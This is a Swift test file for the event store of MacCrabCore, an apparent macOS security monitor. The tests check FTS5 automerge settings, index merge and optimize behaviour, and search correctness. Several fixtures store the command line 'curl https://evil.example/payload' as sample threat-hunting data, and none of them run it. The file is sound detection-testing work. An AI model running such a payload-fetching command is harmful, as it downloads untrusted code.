// EventStoreFTSMergeTests.swift
// v1.21.4 Tier-A per-event CPU optimization — explicit off-path
// ('merge', N) crank. The companion automerge=0 deferral was REVERTED in
// v1.21.6-rc.35 after it drove events_fts into its segment ceiling on an
// installed host; the off-path crank itself is retained and still covered.
//
// These pin the DETECTION-SAFETY contract of the change:
//   - events_fts is read ONLY by search() (threat hunting). Deferring the
//     per-insert segment merge (automerge 4 → 0) and compacting the index
//     off-path must NOT change which rows a MATCH returns.
//   - search() must find inserted events both BEFORE and AFTER an explicit
//     merge, with identical results.
//   - Inline segment merging must remain ENABLED (rc.35). The original
//     automerge=0 deferral is what let events_fts reach FTS5's hard 2000-
//     segment ceiling, at which every write fails SQLITE_FULL.
//   - mergeFTS() succeeds on a writable store and no-ops on a read-only one.

import Testing
import Foundation
import CSQLCipher
@testable import MacCrabCore

@Suite("EventStore: FTS5 automerge deferral + off-path merge (v1.21.4 Tier-A)")
struct EventStoreFTSMergeTests {

    // MARK: - Helpers (mirror EventStoreAiToolFallbackTests)

    private static func tempPath() -> String {
        FileManager.default.temporaryDirectory
            .appendingPathComponent("fts-merge-\(UUID().uuidString).db").path
    }

    private static func makeProcess(
        name: String,
        path: String,
        commandLine: String
    ) -> MacCrabCore.ProcessInfo {
        MacCrabCore.ProcessInfo(
            pid: 4242,
            ppid: 100,
            rpid: 4242,
            name: name,
            executable: path,
            commandLine: commandLine,
            args: commandLine.split(separator: " ").map(String.init),
            workingDirectory: "/Users/alice/project",
            userId: 501,
            userName: "alice",
            groupId: 20,
            startTime: Date(),
            codeSignature: nil,
            ancestors: [],
            architecture: "arm64",
            isPlatformBinary: false,
            hashes: nil,
            session: nil
        )
    }

    private static func makeEvent(
        name: String,
        path: String,
        commandLine: String
    ) -> Event {
        Event(
            eventCategory: .process,
            eventType: .start,
            eventAction: "exec",
            process: makeProcess(name: name, path: path, commandLine: commandLine)
        )
    }

    private static func makeEvent(
        id: UUID,
        timestamp: Date,
        name: String,
        path: String,
        commandLine: String
    ) -> Event {
        Event(
            id: id,
            timestamp: timestamp,
            eventCategory: .process,
            eventType: .start,
            eventAction: "exec",
            process: makeProcess(
                name: name,
                path: path,
                commandLine: commandLine
            )
        )
    }

    private enum AutomergeConfig: Equatable {
        case sqliteDefault
        case configured(Int)

        var effectiveValue: Int {
            // The bundled FTS5 initializes nAutomerge to 4 and treats an
            // explicitly configured 1 as that same default (sqlite3.c:
            // FTS5_DEFAULT_AUTOMERGE / sqlite3Fts5ConfigSetValue).
            switch self {
            case .sqliteDefault, .configured(1): return 4
            case .configured(let value): return value
            }
        }
    }

    private enum AutomergeReadError: Error, Equatable {
        case open, prepare, step, invalidValue
    }

    /// A successful query with no row means SQLite's default, not failure.
    /// Missing files/tables, unsuccessful stepping and invalid persisted values
    /// must never masquerade as an enabled automerge configuration.
    private static func readAutomergeConfig(at path: String) throws -> AutomergeConfig {
        var db: OpaquePointer?
        defer { if let d = db { sqlite3_close(d) } }
        guard sqlite3_open_v2(path, &db, SQLITE_OPEN_READONLY, nil) == SQLITE_OK,
              let db else { throw AutomergeReadError.open }
        var stmt: OpaquePointer?
        defer { sqlite3_finalize(stmt) }
        guard sqlite3_prepare_v2(db, "SELECT v FROM events_fts_config WHERE k = 'automerge'", -1, &stmt, nil) == SQLITE_OK,
              let stmt else { throw AutomergeReadError.prepare }
        switch sqlite3_step(stmt) {
        case SQLITE_DONE: return .sqliteDefault
        case SQLITE_ROW: break
        default: throw AutomergeReadError.step
        }
        guard let value = sqlite3_column_value(stmt, 0),
              sqlite3_value_numeric_type(value) == SQLITE_INTEGER else {
            throw AutomergeReadError.invalidValue
        }
        let configured = sqlite3_value_int64(value)
        guard (0...64).contains(configured) else {
            throw AutomergeReadError.invalidValue
        }
        guard sqlite3_step(stmt) == SQLITE_DONE else {
            throw AutomergeReadError.step
        }
        return .configured(Int(configured))
    }

    /// Count the blocks backing the events_fts index (rows in the internal
    /// `events_fts_data` shadow table). A heavily-fragmented / delete-marked index
    /// has many; a fully-optimized one has a handful.
    private static func readFtsBlockCount(at path: String) -> Int {
        var db: OpaquePointer?
        defer { if let d = db { sqlite3_close(d) } }
        guard sqlite3_open_v2(path, &db, SQLITE_OPEN_READONLY, nil) == SQLITE_OK, let db else { return -1 }
        var stmt: OpaquePointer?
        defer { sqlite3_finalize(stmt) }
        guard sqlite3_prepare_v2(db, "SELECT COUNT(*) FROM events_fts_data", -1, &stmt, nil) == SQLITE_OK,
              sqlite3_step(stmt) == SQLITE_ROW else { return -1 }
        return Int(sqlite3_column_int64(stmt, 0))
    }

    private static func fileSizeMB(at path: String) -> Double {
        let bytes = ((try? FileManager.default.attributesOfItem(atPath: path)[.size]) as? Int) ?? 0
        return Double(bytes) / 1_048_576
    }

    // MARK: - Tests

    @Test("inline segment merging stays enabled in the FTS5 %_config shadow table")
    func automergeRemainsEnabled() async throws {
        // v1.21.6-rc.35: this test previously asserted `automerge == 0`, pinning
        // the v1.21.4 deferral. That deferral is what allowed `events_fts` to
        // walk into FTS5's hard 2000-segment ceiling: with no inline merging,
        // segments accrue at roughly one per two rows, and on an installed host
        // ingestion drove 1165 -> 1999 segments in about 30 seconds — far faster
        // than the off-path merge this optimisation relied on. At the ceiling
        // every write fails SQLITE_FULL, so persistence stalled and roughly a
        // thousand events were dropped per cycle.
        //
        // The off-path `mergeFTS()` crank below is still valuable and still
        // tested; it just cannot be the ONLY thing bounding segment count.
        let path = Self.tempPath()
        defer { try? FileManager.default.removeItem(atPath: path) }
        let store = try EventStore(path: path)
        // Insert at least one row so the FTS index (and its config) materialize.
        try await store.insert(event: Self.makeEvent(
            name: "curl", path: "/usr/bin/curl",
            commandLine: "curl https://evil.example/payload"
        ))
        let configuration = try Self.readAutomergeConfig(at: path)
        #expect(
            configuration.effectiveValue > 0,
            "automerge is disabled again; segment growth is unbounded during writes"
        )
    }

    @Test("automerge inspection distinguishes the FTS default from explicit settings")
    func automergeConfigDefaultAndExplicitValues() throws {
        let path = Self.tempPath()
        defer { try? FileManager.default.removeItem(atPath: path) }
        var connection: OpaquePointer?
        defer { if let connection { sqlite3_close(connection) } }
        try #require(sqlite3_open_v2(
            path, &connection, SQLITE_OPEN_READWRITE | SQLITE_OPEN_CREATE, nil
        ) == SQLITE_OK)
        let db = try #require(connection)
        try #require(sqlite3_exec(
            db, "CREATE VIRTUAL TABLE events_fts USING fts5(value)", nil, nil, nil
        ) == SQLITE_OK)
        let initial = try Self.readAutomergeConfig(at: path)
        #expect(initial == .sqliteDefault)
        #expect(initial.effectiveValue == 4)
        for value in [0, 1, 4, 8] {
            try #require(sqlite3_exec(
                db, "INSERT INTO events_fts(events_fts, rank) VALUES('automerge', \(value))",
                nil, nil, nil
            ) == SQLITE_OK)
            let configured = try Self.readAutomergeConfig(at: path)
            #expect(configured == .configured(value))
            #expect(configured.effectiveValue == (value == 1 ? 4 : value))
        }
    }

    @Test("automerge read failures and malformed values cannot pass as defaults")
    func automergeConfigReadFailuresAreNotDefaults() throws {
        let path = Self.tempPath()
        defer { try? FileManager.default.removeItem(atPath: path) }
        #expect(throws: AutomergeReadError.open) {
            try Self.readAutomergeConfig(at: path)
        }
        #expect(!FileManager.default.fileExists(atPath: path))
        var connection: OpaquePointer?
        defer { if let connection { sqlite3_close(connection) } }
        try #require(sqlite3_open_v2(
            path, &connection, SQLITE_OPEN_READWRITE | SQLITE_OPEN_CREATE, nil
        ) == SQLITE_OK)
        let db = try #require(connection)
        #expect(throws: AutomergeReadError.prepare) {
            try Self.readAutomergeConfig(at: path)
        }
        // A tiny ordinary table tests the reader's error boundary without
        // corrupting a real FTS index or touching any non-fixture database.
        try #require(sqlite3_exec(
            db, "CREATE TABLE events_fts_config(k TEXT PRIMARY KEY, v); "
                + "INSERT INTO events_fts_config VALUES('automerge', NULL)",
            nil, nil, nil
        ) == SQLITE_OK)
        for literal in ["NULL", "-1", "65", "'not-an-integer'", "2.5"] {
            try #require(sqlite3_exec(
                db, "UPDATE events_fts_config SET v = \(literal)", nil, nil, nil
            ) == SQLITE_OK)
            #expect(throws: AutomergeReadError.invalidValue) {
                try Self.readAutomergeConfig(at: path)
            }
        }
        // The view prepares successfully but evaluating abs(Int64.min) fails
        // at sqlite3_step. An interrupted/error result is not SQLITE_DONE.
        try #require(sqlite3_exec(
            db, "DROP TABLE events_fts_config; CREATE VIEW events_fts_config AS "
                + "SELECT 'automerge' AS k, abs(-9223372036854775808) AS v",
            nil, nil, nil
        ) == SQLITE_OK)
        #expect(throws: AutomergeReadError.step) {
            try Self.readAutomergeConfig(at: path)
        }
    }

    @Test("search() finds inserted events BEFORE any explicit merge")
    func searchFindsEventsPreMerge() async throws {
        let path = Self.tempPath()
        defer { try? FileManager.default.removeItem(atPath: path) }
        let store = try EventStore(path: path)

        try await store.insert(event: Self.makeEvent(
            name: "curl", path: "/usr/bin/curl",
            commandLine: "curl https://evil.example/payload"
        ))
        try await store.insert(event: Self.makeEvent(
            name: "ls", path: "/bin/ls",
            commandLine: "ls -la"
        ))

        // No mergeFTS() called yet — the deferred-automerge index must still
        // return exactly the matching row.
        let hits = try await store.searchSnapshot(text: "evil.example", limit: 10)
        #expect(hits.events.count == 1)
        #expect(hits.events.first?.process.name == "curl")
    }

    #if DEBUG
    @Test("smaller cross-block projection winner preserves aggregate coverage")
    func smallerCrossBlockWinnerPreservesCoverage() async throws {
        let path = Self.tempPath()
        defer { try? FileManager.default.removeItem(atPath: path) }
        let store = try EventStore(path: path)

        // Both normal insertion transactions must exercise one bucket even
        // if the scheduler pauses either call across a wall-clock boundary.
        // The DEBUG-only per-store seam leaves release admission unchanged.
        let admissionBucket = Int64(floor(Date().timeIntervalSince1970))
        await store.setJournalAdmissionBucketForTesting(admissionBucket)

        let timestamp = Date(timeIntervalSince1970: 1_700_000_000)
        let priorIDs = [
            "FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFC",
            "FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFD",
            "FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFE",
            "FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF",
        ].map { UUID(uuidString: $0)! }
        let padding = String(repeating: "x", count: 160)
        let prior = priorIDs.enumerated().map { index, id in
            Self.makeEvent(
                id: id,
                timestamp: timestamp,
                name: "prior\(index)",
                path: "/usr/bin/prior\(index)",
                commandLine: "prior\(index) \(padding)"
            )
        }
        let first = try await store.insert(events: prior, lane: .priority)
        #expect(first.persistedCount == 4)

        let winnerID = UUID(
            uuidString: "00000000-0000-0000-0000-000000000001"
        )!
        try await store.insert(event: Self.makeEvent(
            id: winnerID,
            timestamp: timestamp,
            name: "winner",
            path: "/bin/winner",
            commandLine: "winner replacementwinner"
        ))

        let hits = try await store.searchSnapshot(
            text: "replacementwinner",
            limit: 10
        )
        #expect(hits.events.map(\.id) == [winnerID])

        var db: OpaquePointer?
        defer { if let db { sqlite3_close(db) } }
        try #require(sqlite3_open_v2(
            path,
            &db,
            SQLITE_OPEN_READONLY,
            nil
        ) == SQLITE_OK)
        let database = try #require(db)

        var statement: OpaquePointer?
        defer { sqlite3_finalize(statement) }
        try #require(sqlite3_prepare_v2(
            database,
            """
            SELECT COUNT(DISTINCT b.admission_bucket),
                   c.considered_count, c.materialized_count,
                   c.materialized_bytes, c.omitted_replaced_count,
                   c.replacement_total, COUNT(DISTINCT b.block_id)
            FROM event_journal_blocks b
            JOIN event_projection_coverage c
              ON c.bucket_start = b.admission_bucket
            """,
            -1,
            &statement,
            nil
        ) == SQLITE_OK)
        try #require(sqlite3_step(statement) == SQLITE_ROW)
        #expect(sqlite3_column_int64(statement, 0) == 1)
        #expect(sqlite3_column_int64(statement, 1) == 5)
        #expect(sqlite3_column_int64(statement, 2) == 4)
        #expect(sqlite3_column_int64(statement, 3) > 0)
        #expect(sqlite3_column_int64(statement, 4) == 1)
        #expect(sqlite3_column_int64(statement, 5) == 1)
        #expect(sqlite3_column_int64(statement, 6) == 2)
        #expect(sqlite3_step(statement) == SQLITE_DONE)
    }
    #endif

    @Test("mergeFTS() succeeds and search() returns identical results after merge")
    func mergeSucceedsAndSearchUnchanged() async throws {
        let path = Self.tempPath()
        defer { try? FileManager.default.removeItem(atPath: path) }
        let store = try EventStore(path: path)

        // Insert enough distinct rows (each an autocommit txn ⇒ its own FTS
        // segment) that the deferred index actually accumulates segments to
        // merge — this exercises the real off-path compaction.
        for i in 0..<40 {
            try await store.insert(event: Self.makeEvent(
                name: "proc\(i)",
                path: "/usr/bin/proc\(i)",
                commandLine: "proc\(i) --flag mergeprobe needlebeacon\(i % 3)"
            ))
        }

        // Baseline result set (pre-merge).
        let preHits = try await store.searchSnapshot(
            text: "mergeprobe",
            limit: 100
        )
        #expect(!preHits.events.isEmpty)
        let preNames = Set(preHits.events.map { $0.process.name })

        // Off-path compaction crank succeeds.
        let merged = await store.mergeFTS(pages: 64)
        #expect(merged)

        // A second no-op merge is still safe (nothing left to merge).
        let mergedAgain = await store.mergeFTS(pages: 64)
        #expect(mergedAgain)

        // DETECTION-SAFE contract: identical MATCH result set after merge.
        let postHits = try await store.searchSnapshot(
            text: "mergeprobe",
            limit: 100
        )
        let postNames = Set(postHits.events.map { $0.process.name })
        #expect(postNames == preNames)
        #expect(postHits.events.count == preHits.events.count)
    }

    @Test("optimizeFTS() compacts a fragmented/delete-marked index, reclaims space, keeps search correct")
    func optimizeCompactsAndReclaims() async throws {
        let path = Self.tempPath()
        defer {
            try? FileManager.default.removeItem(atPath: path)
            try? FileManager.default.removeItem(atPath: path + "-wal")
            try? FileManager.default.removeItem(atPath: path + "-shm")
        }
        let store = try EventStore(path: path)

        // Churn one sparse admission bucket. Rank replacement leaves FTS
        // segments + delete markers behind without violating the journal's
        // non-negotiable 15-minute canonical-retention floor.
        for cycle in 0..<12 {
            for i in 0..<40 {
                try await store.insert(event: Self.makeEvent(
                    name: "churn\(cycle)_\(i)", path: "/tmp/churn\(cycle)_\(i)",
                    commandLine: "churn cyclehaystack\(cycle) rowneedle\(i)"))
            }
        }
        // A high-rank keeper must enter the bounded sparse tier even when the
        // current admission bucket already contains ordinary churn rows.
        var keeper = Self.makeEvent(
            name: "keeper",
            path: "/usr/bin/keeper",
            commandLine: "keeper survivingtoken"
        )
        keeper.severity = .critical
        try await store.insert(event: keeper)
        await store.walCheckpointTruncate()

        let preKeep = try await store.searchSnapshot(
            text: "survivingtoken",
            limit: 10
        )
        #expect(
            preKeep.events.count == 1
                && preKeep.events.first?.process.name == "keeper"
        )
        #expect(preKeep.projectionOmittedReplaced > 0)

        let blocksBefore = Self.readFtsBlockCount(at: path)
        let sizeBefore = Self.fileSizeMB(at: path)
        // rc.35 restored automerge=4, so ordinary churn no longer LEAVES the
        // index fragmented — inline merging compacts it as it goes, which is the
        // entire point of that change. This assertion was written when automerge
        // was 0 and fragmentation accumulated on its own.
        //
        // What optimizeFTS must still guarantee is unchanged and is asserted
        // below: whatever fragmentation exists, it compacts to a handful of
        // segments and search results are identical afterwards. Requiring the
        // index to be fragmented FIRST would now be asserting the absence of the
        // fix.
        #expect(blocksBefore >= 1, "the FTS index should exist before optimize (got \(blocksBefore))")

        // Optimize + reclaim, mirroring the size-cap sweep.
        #expect(await store.optimizeFTS())
        _ = try await store.incrementalVacuum(maxPages: 200_000)
        await store.walCheckpointTruncate()

        // The proof: whatever the starting fragmentation, optimize compacts the
        // index to a handful of segments (on-device it collapsed 103,766 → 3).
        let blocksAfter = Self.readFtsBlockCount(at: path)
        let sizeAfter = Self.fileSizeMB(at: path)
        #expect(blocksAfter <= blocksBefore, "optimize must not grow the index (\(blocksBefore) → \(blocksAfter))")
        #expect(blocksAfter <= 5, "optimize collapses to a handful of segments (got \(blocksAfter))")
        #expect(sizeAfter <= sizeBefore, "reclaimed space: \(sizeBefore) MB → \(sizeAfter) MB")

        // Correctness: the exact same materialized keeper survives compaction.
        let keep = try await store.searchSnapshot(
            text: "survivingtoken",
            limit: 10
        )
        #expect(keep.events == preKeep.events)
    }

    @Test("optimizeFTS() on a read-only store is a no-op returning false")
    func optimizeNoOpOnReadOnlyStore() async throws {
        let path = Self.tempPath()
        defer {
            try? FileManager.default.removeItem(atPath: path)
            try? FileManager.default.removeItem(atPath: path + "-wal")
            try? FileManager.default.removeItem(atPath: path + "-shm")
        }
        do {
            let rw = try EventStore(path: path)
            try await rw.insert(event: Self.makeEvent(
                name: "curl", path: "/usr/bin/curl", commandLine: "curl https://evil.example/x"))
            await rw.walCheckpoint()
        }
        let ro = try EventStore(path: path, forceReadOnly: true)
        #expect(await ro.optimizeFTS() == false)
        let hits = try await ro.searchSnapshot(text: "evil.example", limit: 10)
        #expect(hits.events.count == 1)
    }

    @Test("mergeFTS() on a read-only store is a no-op returning false")
    func mergeNoOpOnReadOnlyStore() async throws {
        let path = Self.tempPath()
        defer {
            try? FileManager.default.removeItem(atPath: path)
            try? FileManager.default.removeItem(atPath: path + "-wal")
            try? FileManager.default.removeItem(atPath: path + "-shm")
        }
        // Create + populate via a writable store first so the file exists.
        // Checkpoint the WAL into the main DB before dropping the writer so the
        // read-only connection reads cleanly without depending on WAL/-shm.
        do {
            let rw = try EventStore(path: path)
            try await rw.insert(event: Self.makeEvent(
                name: "curl", path: "/usr/bin/curl",
                commandLine: "curl https://evil.example/payload"
            ))
            await rw.walCheckpoint()
        }
        // Open a read-only connection and confirm the merge is refused.
        let ro = try EventStore(path: path, forceReadOnly: true)
        let merged = await ro.mergeFTS()
        #expect(merged == false)
        // The read-only connection can still search (read path unaffected).
        let hits = try await ro.searchSnapshot(text: "evil.example", limit: 10)
        #expect(hits.events.count == 1)
    }
}
